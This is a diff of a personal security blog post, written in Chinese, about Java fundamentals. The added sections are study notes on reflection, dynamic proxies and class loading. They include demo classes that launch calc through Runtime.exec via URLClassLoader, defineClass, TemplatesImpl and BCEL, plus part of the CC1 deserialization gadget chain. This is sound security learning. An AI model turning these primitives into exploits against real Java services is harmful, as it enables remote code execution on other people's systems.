@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913165341467.png">
 <meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230914183413701.png">
 <meta property="article:published_time" content="2023-09-11T13:16:31.000Z">
-<meta property="article:modified_time" content="2023-09-17T03:37:20.517Z">
+<meta property="article:modified_time" content="2023-09-18T15:17:57.755Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911213326053.png">
@@ -251,7 +251,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          13k 字
+          20k 字
         
       </span>
     
@@ -262,7 +262,7 @@
         
         
         
-          107 分钟
+          168 分钟
         
       </span>
     
@@ -449,6 +449,18 @@ BufferedOutputStream bos=<span class="hljs-keyword">new</span> <span class="hljs
 bos.close<span class="hljs-literal">()</span>;<span class="hljs-comment">//关闭的时候也会调用flush，同时关闭out</span></code></pre></div>
 
 <h3 id="ObjectInputStream和ObjectOutputStream"><a href="#ObjectInputStream和ObjectOutputStream" class="headerlink" title="ObjectInputStream和ObjectOutputStream"></a>ObjectInputStream和ObjectOutputStream</h3><p>序列化与反序列化</p>
+<p>重写方法</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException
+
+
+<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream oos)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException
+&#123;
+	oos.defaultReadObject();
+	
+&#125;</code></pre></div>
+
+
+
 <h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p>使用字节流读取中文会出现乱码</p>
 <h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><div class="code-wrapper"><pre><code class="hljs gradle">FileReader fr=<span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;resource/test.txt&quot;</span>);
 <span class="hljs-keyword">char</span>[] buf=<span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">//创建一个缓冲区</span>
@@ -541,7 +553,204 @@ while(it.hasNext())&#123;
 &#125;</code></pre></div>
 
 <p>WOW，<code>entryset</code>，跟CC1的有一步骤有关</p>
-<h2 id="注解与反射"><a href="#注解与反射" class="headerlink" title="注解与反射"></a>注解与反射</h2><h1 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h1><h2 id="创建程序"><a href="#创建程序" class="headerlink" title="创建程序"></a>创建程序</h2><p>首先安装好maven，我修改了maven的repository的位置，所以要在settings.xml中修改，修改完后关键是<code>mvn help system</code>下载<code>repository</code>里的文件（自行上网查吧）</p>
+<h2 id="注解与反射"><a href="#注解与反射" class="headerlink" title="注解与反射"></a>注解与反射</h2><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>, <span class="hljs-params">true</span>, <span class="hljs-params">currentLoader</span>)</span></code></pre></div>
+
+<p>第⼆个参数表示是否初始化，在 forName 的时候，构造函数并不会执⾏，而是执⾏类初始化。他会执行<code>static&#123;&#125;</code>静态块里面的内容</p>
+<p>newInstance()     对类进行实例化</p>
+<p>但需要注意的是，invoke 方法第一个参数并不是固定的：</p>
+<p><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></p>
+<p><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></p>
+<p>如果调用的方法是静态方法。那么invoke<code>方法传入的第一个参数永远为</code>null</p>
+<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(ClassLoader <span class="hljs-params">loader</span>, 类&lt;?&gt;[] <span class="hljs-params">interfaces</span>, InvocationHandler <span class="hljs-params">h</span>)</span> throws IllegalArgumentException</code></pre></div>
+
+<ul>
+<li><code>loader</code> – 类加载器来定义<strong>代理类</strong></li>
+<li><code>interfaces</code> – 代理类实现的<strong>接口列表</strong></li>
+<li><code>h</code> – 调度方法调用的调用<strong>处理函数</strong></li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs gradle">Hello hello = (Hello) Proxy.newProxyInstance(
+            Hello.<span class="hljs-keyword">class</span>.getClassLoader(), <span class="hljs-comment">// 传入ClassLoader</span>
+            <span class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[] &#123; Hello.<span class="hljs-keyword">class</span> &#125;, <span class="hljs-comment">// 传入要实现的接口</span>
+            handler); <span class="hljs-comment">// 传入处理调用方法的InvocationHandler</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">ordinaryStudents</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>, ordinaryStudents.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Interfaces()</span>, handler)</code></pre></div>
+
+<p>通常是这两句，参数调整一下</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">InvocationHandler instance = (InvocationHandler) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Target.<span class="hljs-params">class</span>,<span class="hljs-params">lazymap</span>)</span>;
+Map proxyInstance = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(LazyMap.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>,<span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span><span class="hljs-keyword">class</span>&#125;,instance);</code></pre></div>
+
+
+
+<div class="code-wrapper"><pre><code class="hljs reasonml">Class c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span>;
+
+Constructor constructor = c.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>,Map.<span class="hljs-params">class</span>)</span>;
+
+constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+InvocationHandler instance = (InvocationHandler) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Target.<span class="hljs-params">class</span>,<span class="hljs-params">lazymap</span>)</span>;
+Map proxyInstance = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(LazyMap.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>,<span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span><span class="hljs-keyword">class</span>&#125;,instance);
+Object o = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Override.<span class="hljs-params">class</span>,<span class="hljs-params">proxyInstance</span>)</span>;</code></pre></div>
+
+<h1 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h1><p>BootstrapClassLoader     ExtensionsClassLoader     AppClassLoader</p>
+<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>①：URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</p>
+<p>②：URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找.class文件</p>
+<p>③：URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.bcel;
+
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;
+    <span class="hljs-keyword">static</span>&#123;
+        <span class="hljs-keyword">try</span> &#123;
+            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
+        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>file:&#x2F;&#x2F;       路径为<code>.class</code>文件所在路径</p>
+<div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span>[] args) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;
+        <span class="hljs-type">URLClassLoader</span> urlClassLoader <span class="hljs-operator">=</span> new <span class="hljs-type">URLClassLoader</span>(new <span class="hljs-type">URL</span>[]&#123;new <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;file://C:<span class="hljs-subst">\\</span>Users<span class="hljs-subst">\\</span>86136<span class="hljs-subst">\\</span>Desktop<span class="hljs-subst">\\</span>rmi<span class="hljs-subst">\\</span>out<span class="hljs-subst">\\</span>production<span class="hljs-subst">\\</span>rmi<span class="hljs-subst">\\</span>com<span class="hljs-subst">\\</span>ctf<span class="hljs-subst">\\</span>bcel&quot;</span>)&#125;);
+        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).newInstance();
+    &#125;     <span class="hljs-comment">//包名.类名</span>
+&#125;</code></pre></div>
+
+<p>http:&#x2F;&#x2F;     python起一个http服务</p>
+<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;
+        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)&#125;);
+        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();
+    &#125;     <span class="hljs-comment">//包名.类名</span>
+&#125;</code></pre></div>
+
+<p>将我们之前的 class 文件打包一下，打包为 jar 文件。</p>
+<div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>-cvf calc.<span class="hljs-keyword">jar </span>clac.class</code></pre></div>
+
+<p>file + jar协议</p>
+<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;
+        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);
+        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();
+    &#125;     <span class="hljs-comment">//包名.类名</span>
+&#125;</code></pre></div>
+
+<p>http + jar协议</p>
+<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;
+        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);
+        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();
+    &#125;     <span class="hljs-comment">//包名.类名</span>
+&#125;</code></pre></div>
+
+<h2 id="加载字节码"><a href="#加载字节码" class="headerlink" title="加载字节码"></a>加载字节码</h2><h3 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h3><div class="code-wrapper"><pre><code class="hljs reasonml">define<span class="hljs-constructor">Class(String <span class="hljs-params">name</span>,<span class="hljs-params">byte</span>[] <span class="hljs-params">b</span>,<span class="hljs-params">int</span> <span class="hljs-params">off</span>,<span class="hljs-params">int</span> <span class="hljs-params">len</span>)</span>
+<span class="hljs-comment">//name为类名，b为字节码数组，off为偏移量，len为字节码数组的长度。</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> BCELDemo &#123;
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+        ClassLoader systemClassLoader = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>;
+        Method <span class="hljs-keyword">method</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-params">class</span>, <span class="hljs-params">byte</span>[].<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>)</span>;
+        <span class="hljs-keyword">method</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\rmi\\out\\production\\rmi\\com\\ctf\\bcel\\calc.class&quot;</span>)</span>);
+        Class c = (Class) <span class="hljs-keyword">method</span>.invoke(systemClassLoader,<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>,code,<span class="hljs-number">0</span>,code.length);
+        c.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;
+
+    &#125;
+&#125;</code></pre></div>
+
+<h3 id="Unsafe-的defineClass"><a href="#Unsafe-的defineClass" class="headerlink" title="Unsafe 的defineClass"></a>Unsafe 的defineClass</h3><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;
+    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] <span class="hljs-variable">args</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">Exception</span> &#123;
+        <span class="hljs-title class_">ClassLoader</span> classLoader <span class="hljs-operator">=</span> <span class="hljs-title class_">ClassLoader</span>.<span class="hljs-property">getSystemClassLoader</span>();
+        <span class="hljs-title class_">Class</span><span class="hljs-operator">&lt;</span><span class="hljs-title class_">Unsafe</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Unsafe</span>.<span class="hljs-property">class</span>;
+        <span class="hljs-title class_">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafeClass</span>.<span class="hljs-property">getDeclaredField</span>(<span class="hljs-string">&quot;theUnsafe&quot;</span>);
+        <span class="hljs-variable">unsafeField</span>.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);
+        <span class="hljs-title class_">Unsafe</span> classUnsafe <span class="hljs-operator">=</span> (<span class="hljs-title class_">Unsafe</span>) <span class="hljs-variable">unsafeField</span>.<span class="hljs-property">get</span>(<span class="hljs-literal">null</span>);
+        <span class="hljs-title class_">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafeClass</span>.<span class="hljs-property">getMethod</span>(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>, <span class="hljs-variable">byte</span>[].<span class="hljs-property">class</span>,
+                int.<span class="hljs-property">class</span>, int.<span class="hljs-property">class</span>, <span class="hljs-title class_">ClassLoader</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">ProtectionDomain</span>.<span class="hljs-property">class</span>);
+        <span class="hljs-variable">byte</span>[] <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Files</span>.<span class="hljs-property">readAllBytes</span>(<span class="hljs-title class_">Paths</span>.<span class="hljs-property">get</span>(<span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>86136<span class="hljs-char escape_">\\</span>Desktop<span class="hljs-char escape_">\\</span>rmi<span class="hljs-char escape_">\\</span>out<span class="hljs-char escape_">\\</span>production<span class="hljs-char escape_">\\</span>rmi<span class="hljs-char escape_">\\</span>com<span class="hljs-char escape_">\\</span>ctf<span class="hljs-char escape_">\\</span>bcel<span class="hljs-char escape_">\\</span>calc.class&quot;</span>));
+        <span class="hljs-title class_">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (<span class="hljs-title class_">Class</span>) <span class="hljs-variable">defineClassMethod</span>.<span class="hljs-property">invoke</span>(classUnsafe, <span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>, <span class="hljs-variable">code</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">code</span>.<span class="hljs-property">length</span>, classLoader, <span class="hljs-literal">null</span>);
+        <span class="hljs-variable">calc</span>.<span class="hljs-property">newInstance</span>();
+
+    &#125;
+&#125;</code></pre></div>
+
+<h2 id="TemplatesImpl-加载字节码-！！！！"><a href="#TemplatesImpl-加载字节码-！！！！" class="headerlink" title="TemplatesImpl 加载字节码      ！！！！"></a>TemplatesImpl 加载字节码      ！！！！</h2><div class="code-wrapper"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt;
+
+TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>
+
+-&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span></code></pre></div>
+
+<p><code>TemplatesImpl#getOutputProperties()</code> <code>TemplatesImpl#newTransformer()</code></p>
+<p>可以利用这两个去构造poc</p>
+<p>首先先构造字节码，注意，这里的字节码必须继承<code>AbstractTranslet</code>，因为继承了这一抽象类，所以必须要重写一下里面的方法</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.bcel;
+
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-built_in">super</span>();
+        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+&#125;</code></pre></div>
+
+
+
+<div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> TemplatesRce &#123;  
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception&#123;  
+        byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>)</span>);  
+ TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;  
+ set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>)</span>;  
+ set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">code</span>&#125;)</span>;  
+ set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);  
+ templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;  
+ &#125;  
+    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;  
+        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;  
+ field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;  
+ field.set(obj, value);  
+ &#125;  
+&#125;</code></pre></div>
+
+<h2 id="BCEL-加载字节码"><a href="#BCEL-加载字节码" class="headerlink" title="BCEL 加载字节码"></a>BCEL 加载字节码</h2><p>通过 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码：</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">JavaClass cls = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;
+String code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(cls.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code);
+
+<span class="hljs-keyword">new</span> <span class="hljs-constructor">ClassLoader()</span>.load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-params">code</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;  
+   
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  
+    <span class="hljs-keyword">static</span> &#123;  
+        <span class="hljs-keyword">try</span> &#123;  
+            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  
+ 		&#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  
+            e.printStackTrace();  
+ 		&#125;  
+    &#125;  
+&#125;</code></pre></div>
+
+<h2 id="读p神文章"><a href="#读p神文章" class="headerlink" title="读p神文章"></a>读p神文章</h2><p>编译.xsl生成.class</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，它在<code>defineClass</code>中需要的字节码所对应的基类，就是这里的<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
+<p>XSLT在使用时会先编译成Java字节码，这也就是为什么<code>TemplatesImpl</code>会使用<code>defineClass</code>的原因</p>
+<h1 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h1><h2 id="创建程序"><a href="#创建程序" class="headerlink" title="创建程序"></a>创建程序</h2><p>首先安装好maven，我修改了maven的repository的位置，所以要在settings.xml中修改，修改完后关键是<code>mvn help system</code>下载<code>repository</code>里的文件（自行上网查吧）</p>
 <p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161000684.png" srcset="/img/loading.gif" lazyload alt="image-20230913161000684"></p>
 <p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160546330.png" srcset="/img/loading.gif" lazyload alt="image-20230913160546330"></p>
 <p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160804466.png" srcset="/img/loading.gif" lazyload alt="image-20230913160804466"></p>
